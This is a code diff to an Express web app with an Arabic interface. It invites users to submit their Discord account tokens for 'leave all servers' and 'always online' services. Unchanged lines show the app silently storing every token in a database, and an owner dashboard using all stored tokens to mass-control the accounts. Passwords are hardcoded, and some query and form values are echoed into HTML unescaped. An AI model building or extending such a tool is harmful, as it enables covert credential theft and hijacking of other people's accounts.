@@ -46,12 +46,6 @@ async function updateStat(field, value = 1) {
 const activeClients = new Map();
 const activeSessions = new Map();
 
-const googlePlayGames = [
-  "PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", 
-  "Brawl Stars", "Call of Duty: Mobile", "Subway Surfers", 
-  "Clash of Clans", "8 Ball Pool", "Among Us", "Candy Crush Saga"
-];
-
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser(COOKIE_SECRET));
@@ -103,7 +97,7 @@ const layout = (title, content, autoLock = true) => `<!doctype html>
       outline: none;
       text-align: center;
     }
-    input:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
+    input:focus, select:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
     .btn {
       display: block;
       width: 100%;
@@ -119,6 +113,7 @@ const layout = (title, content, autoLock = true) => `<!doctype html>
       transition: 0.3s;
       box-shadow: 0 4px 15px rgba(255, 123, 0, 0.4);
       margin-bottom: 12px;
+      text-align: center;
     }
     .btn:hover { transform: translateY(-2px); opacity: 0.9; }
     .btn-secondary {
@@ -233,12 +228,12 @@ app.post("/auth", async (req, res) => {
 
   if (password === "mılanmembersite") {
     await updateStat("normalLogins");
-    activeSessions.set(sessionId, { role: "normal", expires: Date.now() + 10 * 60 * 1000 });
+    activeSessions.set(sessionId, { role: "normal", expires: Date.now() + 30 * 60 * 1000 });
     res.cookie("sid", sessionId, { signed: true, httpOnly: true });
     res.redirect("/token-entry");
   } else if (password === "73849274628491837465djfbfbrhdjzkkieueiwksndnxbxjxdjehrbrjfjjdhwwiowjddbskdb9283746518293746xkfbfbrhdjzjjkiieueiwksndnxbx") {
     await updateStat("ownerLogins");
-    activeSessions.set(sessionId, { role: "owner", expires: Date.now() + 10 * 60 * 1000 });
+    activeSessions.set(sessionId, { role: "owner", expires: Date.now() + 30 * 60 * 1000 });
     res.cookie("sid", sessionId, { signed: true, httpOnly: true });
     res.redirect("/owner-dashboard");
   } else {
@@ -251,7 +246,7 @@ const checkNormalAuth = (req, res, next) => {
   const sid = req.signedCookies.sid;
   const session = activeSessions.get(sid);
   if (!session || session.expires < Date.now() || (session.role !== "normal" && session.role !== "owner")) {
-    activeSessions.delete(sid);
+    if (sid) activeSessions.delete(sid);
     return res.redirect("/auth");
   }
   next();
@@ -261,24 +256,28 @@ const checkOwnerAuth = (req, res, next) => {
   const sid = req.signedCookies.sid;
   const session = activeSessions.get(sid);
   if (!session || session.expires < Date.now() || session.role !== "owner") {
-    activeSessions.delete(sid);
+    if (sid) activeSessions.delete(sid);
     return res.redirect("/auth");
   }
   next();
 };
 
-// صفحة إدخال التوكن مع قائمة اختيار الخدمة مسبقاً
+// صفحة اختيار الخدمة عبر أزرار + إدخال التوكن
 app.get("/token-entry", checkNormalAuth, (req, res) => {
+  const service = req.query.service || "leave";
+  const serviceTitle = service === "leave" ? "الخدمة الأولى: إخراج الحساب من السيرفرات" : "الخدمة الثانية: جعل الحساب أونلاين دائماً";
+  
   res.send(layout("إدخال التوكن", `
-    <h2>🔑 إدخال وتفقد التوكن</h2>
-    <p>اختر الخدمة المطلوبة أولاً، ثم ضع توكن حسابك للفحص والتحقق</p>
+    <h2>🦇 اختر الخدمة أولاً يا معلم</h2>
+    <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+      <a href="/token-entry?service=leave" class="btn ${service === 'leave' ? '' : 'btn-secondary'}" style="margin-bottom:0; font-size:13px; padding:10px;">إخراج السيرفرات</a>
+      <a href="/token-entry?service=online" class="btn ${service === 'online' ? '' : 'btn-secondary'}" style="margin-bottom:0; font-size:13px; padding:10px;">حالة أونلاين</a>
+    </div>
+    <p>الخدمة المحددة حالياً: <b>${serviceTitle}</b></p>
     <form method="POST" action="/verify-token">
-      <select name="serviceType" style="margin-bottom: 15px;" required>
-        <option value="leave">الخدمة الأولى: إخراج الحساب من السيرفرات</option>
-        <option value="online">الخدمة الثانية: جعل الحساب أونلاين دائماً</option>
-      </select>
+      <input type="hidden" name="serviceType" value="${service}">
       <input type="text" name="token" placeholder="ضع توكن الحساب هنا..." required autocomplete="off">
-      <button class="btn" type="submit">فحص التوكن ومتابعة</button>
+      <button class="btn" type="submit">فحص التوكن والمتابعة</button>
     </form>
   `));
 });
@@ -289,7 +288,6 @@ app.post("/verify-token", checkNormalAuth, async (req, res) => {
   if (!token) return res.redirect("/token-entry");
 
   try {
-    // فحص التوكن عبر جلب بيانات المستخدم
     const userRes = await fetch(`${API}/users/@me`, {
       headers: { Authorization: token }
     });
@@ -307,14 +305,12 @@ app.post("/verify-token", checkNormalAuth, async (req, res) => {
       ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` 
       : `https://cdn.discordapp.com/embed/avatars/${Number(userData.discriminator || 0) % 5}.png`;
 
-    // حفظ التوكن في قاعدة البيانات بعد التأكد أنه سليم
     await TokenModel.findOneAndUpdate({ token }, { token }, { upsert: true, new: true });
     await updateStat("totalOperations");
     
     res.cookie("user_token", token, { signed: true, httpOnly: true });
     res.cookie("selected_service", serviceType, { signed: true, httpOnly: true });
 
-    // عرض صفحة الحساب مع معلوماته وزر التخطي
     res.send(layout("تم التحقق من الحساب", `
       <img class="avatar" src="${avatarUrl}" alt="Avatar">
       <div class="username">${userData.global_name || userData.username}</div>
@@ -333,7 +329,7 @@ app.post("/verify-token", checkNormalAuth, async (req, res) => {
   }
 });
 
-// التوجيه للخدمة المطلوبة بناءً على اختيار المستخدم
+// التوجيه للخدمة المطلوبة بدقة
 app.get("/proceed-service", checkNormalAuth, (req, res) => {
   const service = req.signedCookies.selected_service;
   if (service === "leave") {
@@ -344,7 +340,7 @@ app.get("/proceed-service", checkNormalAuth, (req, res) => {
     res.redirect("/token-entry");
   }
 });
-// --- لوحة تحكم المالك والخدمات ---
+// --- لوحة تحكم المالك ---
 app.get("/owner-dashboard", checkOwnerAuth, (req, res) => {
   res.send(layout("لوحة تحكم المالك", `
     <h2>👑 أهلاً بك يا مالك الموقع</h2>
@@ -389,10 +385,10 @@ app.post("/api/owner/leave-all", checkOwnerAuth, async (req, res) => {
   const tokens = await TokenModel.find({});
   
   for (const user of tokens) {
-    res.write(`<b>--- بدء معالجة الحساب ---</b><br>`);
+    res.write(`<b>--- معالجة حساب جديد ---</b><br>`);
     try {
       const gRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: user.token } });
-      if (!gRes.ok) { res.write(`فشل جلب سيرفرات أحد الحسابات<br>`); continue; }
+      if (!gRes.ok) { res.write(`فشل جلب سيرفرات الحساب<br>`); continue; }
       const guilds = await gRes.json();
       for (const guild of guilds) {
         const lRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: user.token } });
@@ -487,6 +483,7 @@ app.get("/owner/info", checkOwnerAuth, async (req, res) => {
 app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
   const tokens = await TokenModel.find({});
   let successCount = 0;
+  const googlePlayGames = ["PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", "Brawl Stars", "Call of Duty: Mobile"];
 
   for (const user of tokens) {
     if (activeClients.has(user.token)) continue;
@@ -512,11 +509,13 @@ app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
   `));
 });
 
-// تنفيذ الخدمات العادية
+// --- الخدمات الفردية (مع التصميم المطلوب) ---
+
+// 1. خروج الحساب من كل السيرفرات مع طباعة الصيغة المطلوبة
 app.get("/leave-servers", checkNormalAuth, async (req, res) => {
   res.send(layout("جاري المغادرة...", `
     <h2>⚠️ جاري الخروج من السيرفرات...</h2>
-    <div class="logs-box" id="logs">جاري جلب القائمة...</div>
+    <div class="logs-box" id="logs">جاري جلب قائمة السيرفرات...</div>
     <script>
       async function startLeaving() {
         const box = document.getElementById('logs');
@@ -531,12 +530,12 @@ app.get("/leave-servers", checkNormalAuth, async (req, res) => {
             box.innerHTML += decoder.decode(value, { stream: true });
             box.scrollTop = box.scrollHeight;
           }
-          box.innerHTML += '<br><b>✅ تم الانتهاء!</b>';
-          setTimeout(() => { window.location.href = '/token-entry'; }, 3000);
-        } catch (e) { box.innerHTML += '<br>❌ خطأ.'; }
+          box.innerHTML += '<br><b>✅ تم الانتهاء من مغادرة السيرفرات!</b>';
+        } catch (e) { box.innerHTML += '<br>❌ حدث خطأ.'; }
       }
       startLeaving();
     </script>
+    <br><a class="btn" href="/token-entry">العودة للرئيسية</a>
   `));
 });
 
@@ -545,7 +544,7 @@ app.post("/api/leave", checkNormalAuth, async (req, res) => {
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
   try {
     const guildsRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: token } });
-    if (!guildsRes.ok) { res.write("فشل الجلب."); return res.end(); }
+    if (!guildsRes.ok) { res.write("فشل جلب السيرفرات.<br>"); return res.end(); }
     const guilds = await guildsRes.json();
     for (const guild of guilds) {
       const leaveRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: token } });
@@ -556,31 +555,43 @@ app.post("/api/leave", checkNormalAuth, async (req, res) => {
       }
       await new Promise(r => setTimeout(r, 800));
     }
-  } catch (e) { res.write("خطأ."); }
+  } catch (e) { res.write("حدث خطأ عام أثناء العملية.<br>"); }
   await updateStat("totalOperations");
   res.end();
 });
 
+// 2. خيارات الحالة أونلاين بالتفصيل (الحالة، الفعالية، النص)
 app.get("/online-options", checkNormalAuth, (req, res) => {
-  res.send(layout("الحالة أونلاين", `
+  res.send(layout("إعداد حالة أونلاين", `
     <h2>🟢 إبقاء الحساب أونلاين دائماً</h2>
     <form method="POST" action="/start-online">
-      <select name="statusType">
+      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">حالة الحساب:</label>
+      <select name="status" required>
+        <option value="online">متصل (Online)</option>
+        <option value="idle">خامل (Idle)</option>
+        <option value="dnd">الرجاء عدم الإزعاج (DND)</option>
+      </select>
+
+      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">فعالية الحساب (Activity Type):</label>
+      <select name="statusType" required>
         <option value="PLAYING">يلعب (Playing)</option>
         <option value="STREAMING">يبث (Streaming)</option>
         <option value="WATCHING">يشاهد (Watching)</option>
         <option value="LISTENING">يستمع (Listening)</option>
       </select>
-      <input type="text" name="statusText" placeholder="اسم النشاط..." required>
-      <button class="btn" type="submit">تشغيل الحالة</button>
+
+      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">النص المكتوب (Activity Text):</label>
+      <input type="text" name="statusText" placeholder="اكتب اسم اللعبة أو النشاط هنا..." required autocomplete="off">
+
+      <button class="btn" type="submit">تشغيل الحالة وتثبيتها</button>
     </form>
-    <a class="btn btn-secondary" href="/token-entry">العودة</a>
+    <a class="btn btn-secondary" href="/token-entry">العودة للرئيسية</a>
   `));
 });
 
 app.post("/start-online", checkNormalAuth, async (req, res) => {
   const token = req.signedCookies.user_token;
-  const { statusType, statusText } = req.body;
+  const { status, statusType, statusText } = req.body;
   if (!token) return res.redirect("/token-entry");
 
   if (activeClients.has(token)) {
@@ -590,16 +601,26 @@ app.post("/start-online", checkNormalAuth, async (req, res) => {
 
   const client = new Client();
   client.on("ready", () => {
-    client.user.setPresence({ activities: [{ name: statusText, type: statusType }], status: "online" });
+    client.user.setPresence({
+      activities: [{ name: statusText, type: statusType }],
+      status: status
+    });
   });
 
   try {
     await client.login(token);
     activeClients.set(token, client);
     await updateStat("totalOperations");
-    res.send(layout("تم التشغيل", `<h2>🚀 تم التفعيل بنجاح!</h2><a class="btn" href="/token-entry">العودة</a>`));
+    res.send(layout("تم التشغيل", `
+      <h2>🚀 تم تفعيل الحالة بنجاح!</h2>
+      <p>الحساب الآن أونلاين بوضع <b>(${status})</b> ونشاط <b>(${statusType}: ${statusText})</b> وسيبقى يعمل طالما السيرفر يعمل.</p>
+      <a class="btn" href="/token-entry">العودة للرئيسية</a>
+    `));
   } catch (err) {
-    res.send(layout("خطأ", `<h2>❌ التوكن غير صالح</h2><a class="btn" href="/online-options">إعادة المحاولة</a>`));
+    res.send(layout("خطأ", `
+      <h2>❌ التوكن غير صالح أو فشل الاتصال</h2>
+      <a class="btn" href="/online-options">إعادة المحاولة</a>
+    `));
   }
 });
 
